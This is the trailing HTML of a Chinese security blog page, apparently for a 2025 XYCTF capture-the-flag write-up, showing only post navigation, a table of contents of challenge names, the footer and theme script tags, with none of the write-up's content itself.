		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">深入理解modprobe_path提权方式</span>
						<span class="post-nav-item">上一篇</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/blog/2025/04/01/%E5%A4%8D%E6%9D%82%E7%A8%8B%E5%BA%8Ffuzz%E5%88%9D%E6%8E%A2/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">复杂程序fuzz初探</span>
						<span class="post-nav-item">下一篇</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">目录</div>
		<div class="page-title">2025xyctf wp</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">一、战队信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="nav-text">二、解题情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-text">三、解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-signin"><span class="nav-text">web-Signin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web-ezsql%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD"><span class="nav-text">web-ezsql(手动滑稽)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web-fate"><span class="nav-text">web-fate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web-now-you-see-me-1"><span class="nav-text">web-Now you see me 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web-ez_puzzle"><span class="nav-text">web-ez_puzzle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-ret2libcs-revenge"><span class="nav-text">pwn-Ret2libc&#39;s Revenge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-web%E8%8B%A6%E6%89%8B"><span class="nav-text">pwn-web苦手</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-bot"><span class="nav-text">pwn-bot</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="nav-text">pwn-奶龙回家</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-%E6%98%8E%E6%97%A5%E6%96%B9%E8%88%9F%E5%AF%BB%E8%AE%BF%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="nav-text">pwn-明日方舟寻访模拟器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-girlfriend"><span class="nav-text">pwn-girlfriend</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-ez3.0"><span class="nav-text">pwn-EZ3.0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-heap2"><span class="nav-text">pwn-heap2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#re-warmup"><span class="nav-text">re-WARMUP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#re-dragon"><span class="nav-text">re-Dragon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#re-moon"><span class="nav-text">re-Moon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#crypto-division"><span class="nav-text">crypto-Division</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#crypto-reed"><span class="nav-text">crypto-reed</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-%E9%97%AE%E5%8D%B7"><span class="nav-text">misc-问卷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-xgctf"><span class="nav-text">misc-XGCTF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="nav-text">misc-签个到吧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-mader%E4%B9%9F%E8%A6%81%E5%BD%93ctfer"><span class="nav-text">misc-MADer也要当CTFer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-%E4%BC%9A%E9%A3%9E%E7%9A%84%E9%9B%B7%E5%85%8B%E8%90%A8%E6%96%AF"><span class="nav-text">misc-会飞的雷克萨斯</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2"><span class="nav-text">misc-曼波曼波曼波</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc-greedymen"><span class="nav-text">misc-Greedymen</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/blog/">collectcrop</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 31 篇文章
                    </span>
                    
                        <span>
                            共 171.7k 字
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">访问人数</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">总访问量</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.1</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>



<script src="/blog/build/js/libs/Swup.min.js"></script>

<script src="/blog/build/js/libs/SwupSlideTheme.min.js"></script>

<script src="/blog/build/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/blog/build/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/blog/build/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/blog/build/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/blog/build/js/tools/imageViewer.js" type="module"></script>

<script src="/blog/build/js/utils.js" type="module"></script>

<script src="/blog/build/js/main.js" type="module"></script>

<script src="/blog/build/js/layouts/navbarShrink.js" type="module"></script>

<script src="/blog/build/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/blog/build/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/blog/build/js/layouts/categoryList.js" type="module"></script>





    
<script src="/blog/build/js/tools/codeBlock.js" type="module"></script>




    
<script src="/blog/build/js/layouts/lazyload.js" type="module"></script>




    
<script src="/blog/build/js/tools/runtime.js"></script>

    
<script src="/blog/build/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/blog/assets/odometer-theme-minimal.css">




  
<script src="/blog/build/js/libs/Typed.min.js"></script>

  
<script src="/blog/build/js/plugins/typed.js" type="module"></script>











    
<script src="/blog/build/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/blog/build/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/blog/build/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/blog/build/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/blog/build/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>